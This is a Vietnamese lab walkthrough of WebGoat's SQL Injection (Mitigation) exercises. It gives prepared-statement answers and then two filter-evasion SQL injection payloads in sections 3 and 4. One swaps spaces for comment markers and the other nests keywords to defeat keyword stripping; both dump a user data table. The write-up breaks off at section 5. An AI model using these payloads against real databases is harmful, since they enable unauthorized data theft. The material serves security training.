---
title: "(A3) SQL Injection - SQL Injection (Mitigation) - Webgoat"
tag: "webgoat"
subtitle: " 🐐
  Bài viết này mình sẽ hướng dẫn các bạn làm phần (A3) SQL Injection - SQL Injection (Mitigation)"
date: "21-3-2024"
id: "12"
---

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711097747/WebGoat/WebGoat_ad2axz.png)

## 1. Try it! Writing safe code 1

- Ta lần lượt điền các từ sau để hoàn thành câu lệnh: `getConnection`, `PreparedStatement`, `prepareStatement`, `?`, `?`, `setString`, `setString`. Nhấn Submit:

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711191216/WebGoat/H51_tkc7rk.png)

## 2. Try it! Writing safe code 2

- Nhập đoạn code sau để kết nối với database và bấm Submit:

```java
try{
Connection ct = null;
ct=DriverManager.getConnection (DBURL, DBUSER, DBPW);
PreparedStatement ps=ct.prepareStatement("select * from users where name=?"); ps.setString(1,"3");
ResultSet rs=ps.executeQuery();}
catch(Exception e)
{
System.out.println("PseudoTime");
}
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711191216/WebGoat/H52_aewi71.png)

## 3. Input validation alone is not enough 1 !!

- Ta nhập đoạn code sau và nhấn Get Account Info:

```java
';/**/SELECT/**/*/**/FROM/**/user_system_data/**/WHERE/**/1/**/=/**/1;/**/--
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711191216/WebGoat/H53_vzzxyq.png)

## 4. Input validation alone is not enough 2!!

- Ta nhập đoạn code sau và nhấn Get Account Info:

```java
';/**/SELSELECTECT/**/*/**/FRFROMOM/**/user_system_data/**/WHERE/**/1/**/=/**/1;/**/--
```

![alt](https://res.cloudinary.com/dhs93uix6/image/upload/v1711191216/WebGoat/H54_oo0rld.png)

## 5. IP address webgoat-prd server

- Mở WebGoat trên trình duyệt của Burp Suite:
  Còn tiếp.....
